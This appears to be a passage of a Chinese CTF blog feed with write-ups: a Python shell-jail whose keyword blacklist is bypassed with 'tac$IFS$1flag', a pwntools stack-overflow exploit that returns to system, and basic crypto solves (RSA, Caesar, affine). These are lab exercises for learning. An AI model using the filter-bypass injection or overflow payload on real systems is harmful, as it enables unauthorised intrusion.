class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">art = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   ((  &quot;####@@!!$$    ))</span></span><br><span class="line"><span class="string">       `#####@@!$$`  ))</span></span><br><span class="line"><span class="string">    ((  &#x27;####@!!$:</span></span><br><span class="line"><span class="string">   ((  ,####@!!$:   ))</span></span><br><span class="line"><span class="string">       .###@!!$:</span></span><br><span class="line"><span class="string">       `##@@!$:</span></span><br><span class="line"><span class="string">        `#@!!$</span></span><br><span class="line"><span class="string">  !@#    `#@!$:       @#$</span></span><br><span class="line"><span class="string">   #$     `#@!$:       !@!</span></span><br><span class="line"><span class="string">            &#x27;@!$:</span></span><br><span class="line"><span class="string">        &#x27;`\   &quot;!$: /`&#x27;</span></span><br><span class="line"><span class="string">           &#x27;\  &#x27;!: /&#x27;</span></span><br><span class="line"><span class="string">             &quot;\ : /&quot;</span></span><br><span class="line"><span class="string">  -.&quot;-/\\\-.&quot;//.-&quot;/:`\.&quot;-.JrS&quot;.&quot;-=_\\</span></span><br><span class="line"><span class="string">&quot; -.&quot;-.\\&quot;-.&quot;//.-&quot;.`-.&quot;_\\-.&quot;.-\&quot;.-//&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(art)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My_shell_ProVersion&quot;</span>)</span><br><span class="line"></span><br><span class="line">blacklist = [<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;cd&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>()</span><br><span class="line">    <span class="built_in">print</span>(command)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> command:</span><br><span class="line">            <span class="built_in">print</span>(command)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    os.system(command)</span><br><span class="line">    </span><br><span class="line">===================================================================================================================</span><br><span class="line">slove.py</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28994</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;tac$IFS$1flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="SWPUCTF-2021-新生赛-gift-pwn（栈溢出查看偏移）"><a href="#SWPUCTF-2021-新生赛-gift-pwn（栈溢出查看偏移）" class="headerlink" title="[SWPUCTF 2021 新生赛]gift_pwn（栈溢出查看偏移）"></a>[SWPUCTF 2021 新生赛]gift_pwn（栈溢出查看偏移）</h2><ol><li>直接用ida查看0x10 + 8</li></ol><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230725121502497.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230725121502497.png"  class="" lazyload></a><ol start="2"><li><p>gdb覆盖查看，从rsp到rbp</p><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230725121544874.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230725121544874.png"  class="" lazyload></a></li><li><p>cyclic 偏移查看： 一般cyclic -l 错误的偏移地址</p><p>这道题根据偏移直接送结果就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&#x27;./attach&#x27;</span></span><br><span class="line">elf = ELF(BINARY)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(BINARY)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28217</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">s=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        gdb.attach(p, s)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">x, y</span>): <span class="keyword">return</span> log.success(<span class="string">f&#x27;<span class="subst">&#123;x&#125;</span>: <span class="subst">&#123;<span class="built_in">hex</span>(y)&#125;</span>&#x27;</span>)</span><br><span class="line">system = <span class="number">0x400480</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(system)</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTFSHOW&quot;&gt;&lt;a href=&quot;#CTFSHOW&quot; class=&quot;headerlink&quot; title=&quot;CTFSHOW&quot;&gt;&lt;/a&gt;CTFSHOW&lt;/h1&gt;&lt;h2 id=&quot;pwn37-38-return-text&quot;&gt;&lt;a href=&quot;#pwn37-38-retu</summary>
      
    
    
    
    <category term="Pwn" scheme="https://kidder1.github.io/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="https://kidder1.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>数论和抽象代数基础</title>
    <link href="https://kidder1.github.io/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/"/>
    <id>https://kidder1.github.io/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/</id>
    <published>2023-07-23T07:30:09.000Z</published>
    <updated>2023-08-02T08:36:40.112Z</updated>
    
    <content type="html"><![CDATA[<h1 id="素数-欧几里得定理-算术基本定理"><a href="#素数-欧几里得定理-算术基本定理" class="headerlink" title="素数  欧几里得定理  算术基本定理"></a>素数  欧几里得定理  算术基本定理</h1><a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723154128841.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723154128841.png"  class="" lazyload></a><h2 id=""><a href="#" class="headerlink" title=""></a><a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723154730486.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723154730486.png"  class="" lazyload></a></h2><h1 id="模运算"><a href="#模运算" class="headerlink" title="模运算"></a>模运算</h1><a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723154926042.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723154926042.png"  class="" lazyload></a><a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723155116655.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723155116655.png"  class="" lazyload></a><a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723155142800.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723155142800.png"  class="" lazyload></a><h1 id="欧几里得算法：辗转相除法"><a href="#欧几里得算法：辗转相除法" class="headerlink" title="欧几里得算法：辗转相除法"></a>欧几里得算法：辗转相除法</h1><a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723201741963.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723201741963.png"  class="" lazyload></a><p>将大的数字的最大公因数可以转换成小的数字进行计算</p><p><strong><a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723201915279.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723201915279.png"  class="" lazyload></a></strong></p><h1 id="乘法逆元"><a href="#乘法逆元" class="headerlink" title="乘法逆元"></a>乘法逆元</h1><p>​<a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723205038469.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723205038469.png"  class="" lazyload></a></p> <a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723210310770.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723210310770.png"  class="" lazyload></a><h1 id="中国剩余定理"><a href="#中国剩余定理" class="headerlink" title="中国剩余定理"></a>中国剩余定理</h1><a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723212100571.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723212100571.png"  class="" lazyload></a>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;素数-欧几里得定理-算术基本定理&quot;&gt;&lt;a href=&quot;#素数-欧几里得定理-算术基本定理&quot; class=&quot;headerlink&quot; title=&quot;素数  欧几里得定理  算术基本定理&quot;&gt;&lt;/a&gt;素数  欧几里得定理  算术基本定理&lt;/h1&gt;&lt;a class=&quot;sim</summary>
      
    
    
    
    <category term="Math" scheme="https://kidder1.github.io/categories/Math/"/>
    
    
    <category term="Math" scheme="https://kidder1.github.io/tags/Math/"/>
    
  </entry>
  
  <entry>
    <title>Crypto_CTF</title>
    <link href="https://kidder1.github.io/2023/07/20/Crypto_CTF/"/>
    <id>https://kidder1.github.io/2023/07/20/Crypto_CTF/</id>
    <published>2023-07-20T14:00:37.000Z</published>
    <updated>2023-08-02T08:51:58.956Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="HNCTF"><a href="#HNCTF" class="headerlink" title="HNCTF"></a>HNCTF</h1><h2 id="baBAbaseSEse（base家族）"><a href="#baBAbaseSEse（base家族）" class="headerlink" title="baBAbaseSEse（base家族）"></a>baBAbaseSEse（base家族）</h2><p>base家族 </p><ul><li><p>随波逐流梭哈</p><a class="simple-lightbox" href="/2023/07/20/Crypto_CTF/image-20230720220320082.png"><img   src="/images/loading.svg" data-src="/2023/07/20/Crypto_CTF/image-20230720220320082.png"  class="" lazyload></a></li><li><p>basecrack一把梭，windows我装不上，然后我就装到ubuntu了</p><a class="simple-lightbox" href="/2023/07/20/Crypto_CTF/image-20230720224021152.png"><img   src="/images/loading.svg" data-src="/2023/07/20/Crypto_CTF/image-20230720224021152.png"  class="" lazyload></a></li></ul><h2 id="babyRsa（基本RSA）"><a href="#babyRsa（基本RSA）" class="headerlink" title="babyRsa（基本RSA）"></a>babyRsa（基本RSA）</h2><p>基础知识</p><blockquote><p>注意：这里不能安装其他库，不然会因为版本问产生一系列的兼容性问题</p></blockquote><ol><li>PyCryptodome库主要由以下模块组成：</li></ol><ul><li><code>Crypto.Cipher</code>：包含对称加密算法，如AES、DES等。</li><li><code>Crypto.PublicKey</code>：包含非对称加密算法，如RSA、DSA等。</li><li><code>Crypto.Hash</code>：包含哈希函数，如SHA256、MD5等。</li><li><code>Crypto.Signature</code>：包含数字签名相关功能。</li><li><code>Crypto.Random</code>：提供随机数生成器。</li><li><code>Crypto.Protocol</code>：包含各种协议实现，如PBKDF2。</li><li><code>Crypto.Util</code>：包含一些实用工具，如填充、字节处理等</li></ul><ol start="2"><li><p>对于RSA的一些工具</p><ul><li><p><strong>YAFU</strong>： YAFU（Yet Another Factoring Utility）是一个开源的用于整数因数分解的命令行工具。它是一个强大而灵活的工具，能够分解大整数为其质因数，有助于解决数论和密码学领域中的问题。YAFU是基于GMP（GNU多精度算法库）的，并使用了多种因数分解算法来优化分解过程。它是数学爱好者、密码学研究人员和密码分析者常用的工具之一</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.使用 cmd 进入到 yafu 所在目录下，或将目录加入到系统环境 PATH 变量，或打开目录文件夹后 shift+右键 选择在此处打开 powershell </span><br><span class="line">2.假如要分解因数 6 ，输入命令：.\yafu-x64.exe &quot;factor(6)&quot;</span><br><span class="line">3.如果因数过长，将 因数 用文本文件存放在 yafu 目录下，例如：data.txt 。文件最后一行一定要换行，否则eof; done processing batchfile。 运行命令：.\yafu-x64.exe &quot;factor(@)&quot; -batchfile data.txt</span><br></pre></td></tr></table></figure></li><li><p><strong>FactorDB</strong>： FactorDB是一个在线的整数因数分解数据库。它允许用户将大整数提交到数据库，并查找其质因数分解。这个数据库是由全球用户提交的整数分解结果共同维护的，它采用了多种现代算法来分解整数。FactorDB 对于那些没有自己的因数分解工具或想要验证分解结果的用户来说是非常有用的。通过FactorDB，用户可以快速地找到一个整数的质因数，而无需自行进行因数分解运算 网站<a href="http://www.factordb.com/">factordb.com</a></p></li></ul><p>这个题是一个简单的RSA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="comment"># 这里我们导入了bytes_to_long函数，它用于将字节转换为长整数（将flag转换为m），以及导入了getPrime函数，它用于生成指定位数的随机素数。</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">P39 = <span class="number">265147241000574873803071047177766359643</span></span><br><span class="line">P39 = <span class="number">234560843346150602519484260867514743467</span></span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line"><span class="comment"># 这两行代码使用getPrime(128)函数生成两个128位的随机素数，并将它们赋值给变量p和q。在RSA加密中，p 和 q 是用于计算 RSA 公钥和私钥的重要参数。</span></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">17331436837911040930486942133359735652484926528331507431552667656734821231501</span></span><br><span class="line"><span class="comment"># n 是RSA的模数，它是两个素数 p 和 q 的乘积。</span></span><br><span class="line"><span class="comment"># e 是RSA的公钥指数，通常为固定值 65537（也称为常用的 RSA 公钥指数）。</span></span><br><span class="line"><span class="comment"># c 是RSA的密文，通过用公钥指数 e 对明文 m 进行模幂运算得到。</span></span><br><span class="line"><span class="built_in">print</span>(n,c)</span><br><span class="line"><span class="comment"># 62193160459999883112594854240161159254035770172137079047232757011759606702281</span></span><br><span class="line"><span class="comment"># 17331436837911040930486942133359735652484926528331507431552667656734821231501</span></span><br></pre></td></tr></table></figure><p>通过上述工具进行分解之后，然后写出对应的解密脚本即可，这里主要是了解了这些库的一些基本使用而已</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">计算 RSA 私钥参数：</span><br><span class="line">使用已知的 p 和 q 计算了模数 n，并通过调用 invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)) 函数计算得到私钥指数 d。</span><br><span class="line">RSA 解密并输出明文：</span><br><span class="line">使用得到的私钥指数 d 和模数 n，将密文 c 进行 RSA 解密，并通过 long_to_bytes 函数将解密后的长整数转换为明文，并进行输出。</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">234560843346150602519484260867514743467</span></span><br><span class="line">q = <span class="number">265147241000574873803071047177766359643</span></span><br><span class="line">c = <span class="number">17331436837911040930486942133359735652484926528331507431552667656734821231501</span></span><br><span class="line">n = p * q</span><br><span class="line">d = invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br></pre></td></tr></table></figure><p>然后安装了sage的软件，还没有使用，明天再看看吧！</p></li></ol><h2 id="A-dictator（凯撒密码）"><a href="#A-dictator（凯撒密码）" class="headerlink" title="A dictator（凯撒密码）"></a>A dictator（凯撒密码）</h2><p>凯撒密码就是根据偏移移位的密码</p><p>加密过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># # 用于生成一个在范围 [1, 100] 内的随机整数，并将其对 26 取模，以确保得到的偏移量在 0 到 25 之间</span></span><br><span class="line">offset = randint(<span class="number">1</span>,<span class="number">100</span>) % <span class="number">26</span></span><br><span class="line"><span class="built_in">print</span>(offset)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&#x27;NSSCTF&#123;&#x27;</span>)</span><br><span class="line"><span class="comment"># 确保flag字符串中除去前7个字符和最后一个字符的部分，所有字符都不是大写字母</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>([<span class="built_in">ord</span>(c) <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> flag[<span class="number">7</span>:-<span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> flag[<span class="number">7</span>:-<span class="number">1</span>]:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= <span class="built_in">ord</span>(char) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        <span class="comment"># 小写字母计算偏移量</span></span><br><span class="line">        index = <span class="built_in">ord</span>(char)-<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        <span class="comment"># 计算新的字符</span></span><br><span class="line">        new_char = <span class="built_in">chr</span>((index+offset)%<span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">        <span class="built_in">print</span>(new_char,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(char,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># 密文</span></span><br><span class="line"><span class="comment"># cipher = &#x27;nby_wuymul_wcjbyl_cm_ihy_iz_nby_gimn_vumcw_wfummcwuf_wcjbylm&#x27;</span></span><br></pre></td></tr></table></figure><p>解密过程：这个加密解密完都是小写字母，通过25个随机数字进行爆破解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">&#x27;nby_wuymul_wcjbyl_cm_ihy_iz_nby_gimn_vumcw_wfummcwuf_wcjbylm&#x27;</span></span><br><span class="line"><span class="comment"># 从0-25遍历</span></span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= <span class="built_in">ord</span>(i) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">            index = <span class="built_in">ord</span>(i) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            new_char = <span class="built_in">chr</span>((index + offset) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(new_char, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(i, end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>官方wp有一个string的库，这里学习了一下</p><blockquote><p><strong>问：from string import ascii_lowercase  string库是什么库？</strong></p><p><strong>答：在Python中，<code>string</code> 是一个标准库，它包含了许多与字符串处理相关的常用常量和函数。通过导入 <code>string</code> 库，你可以使用其中定义的常量和函数，而不需要自己定义相同的内容。</strong></p><p><strong>在给定的代码中，使用 <code>from string import ascii_lowercase</code> 导入了 <code>string</code> 标准库中的 <code>ascii_lowercase</code> 常量。<code>ascii_lowercase</code> 是一个包含所有小写字母的字符串，它的值为 <code>&#39;abcdefghijklmnopqrstuvwxyz&#39;</code>。这样一来，代码就可以直接使用 <code>ascii_lowercase</code> 变量来表示小写字母表，而不需要手动定义这个字符串。</strong></p></blockquote><h2 id="爱妃（仿射密码）"><a href="#爱妃（仿射密码）" class="headerlink" title="爱妃（仿射密码）"></a>爱妃（仿射密码）</h2><p>放射密码（Affine Cipher）是一种古典密码学中的替换密码，它对字母表中的字符进行加密和解密。放射密码的数学原理涉及到仿射函数的应用。</p><p>放射函数的一般形式为：E(x) &#x3D; (ax + b) mod m</p><p>其中：</p><ul><li>E(x) 表示密文字符；</li><li>x 表示明文字符；</li><li>a 和 b 是整数，并且满足 a 和 m 互质（最大公约数为1）；</li><li>mod m 表示对 m 取模，即结果在 0 到 (m-1) 的范围内。</li></ul><p>在放射密码中，每个明文字符 x 被映射为一个密文字符 E(x)。参数 a 和 b 是放射函数的密钥，通过正确选择这些密钥，可以实现有效的加密和解密。</p><p>解密过程是对密文字符应用逆放射函数：D(y) &#x3D; a^(-1) * (y - b) mod m，其中 a^(-1) 表示 a 的乘法逆元素。</p><a class="simple-lightbox" href="/2023/07/20/Crypto_CTF/image-20230722180423532.png"><img   src="/images/loading.svg" data-src="/2023/07/20/Crypto_CTF/image-20230722180423532.png"  class="" lazyload></a><a class="simple-lightbox" href="/2023/07/20/Crypto_CTF/image-20230722181454094.png"><img   src="/images/loading.svg" data-src="/2023/07/20/Crypto_CTF/image-20230722181454094.png"  class="" lazyload></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher, a_invert, b, m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([a_invert*(i   - b) % m <span class="keyword">for</span> i <span class="keyword">in</span> cipher])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">message, a, b, m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([(<span class="built_in">ord</span>(i) * a + b) % m <span class="keyword">for</span> i <span class="keyword">in</span> message])</span><br><span class="line"></span><br><span class="line">c = <span class="string">b&#x27;y\xba\xba\xea\xc7\x11\xc2\xc7\xcb\xd8ZV\xd8ZVp\xb1\xb1\xd8\x19\xa4V\xa4\x19\x8aM\xa83g\xd8&amp;\x19\xdc&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;NSSCTF&#123;&#x27;</span></span><br><span class="line"><span class="comment"># 计算密钥a，b</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">if</span> encrypt(flag, a, b, m) <span class="keyword">in</span> c:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"> <span class="comment"># print(a, b)</span></span><br><span 